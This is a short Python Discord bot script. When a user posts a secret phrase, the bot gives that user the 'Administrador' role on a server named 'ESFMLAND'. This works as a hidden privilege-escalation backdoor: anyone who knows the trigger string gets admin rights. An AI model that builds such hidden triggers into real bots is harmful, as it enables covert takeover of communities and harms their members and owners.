from discord.utils import get
import discord

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
    if message.author == client.user:
            return None
    if message.content == 'pruebabb123457':
        print("Hola mundo")
        for server in client.guilds:
            for member in server.members:
                if str(server) == 'ESFMLAND':
                    if member == message.author:
                        role = get(server.roles, name = 'Administrador')
                        try:
                            await member.add_roles(role)
                        except Exception as e:
                            print("ERROR AL PONER ROL", e)
                        else:
                            print("Éxito")
                        break
    
client.run('#key')
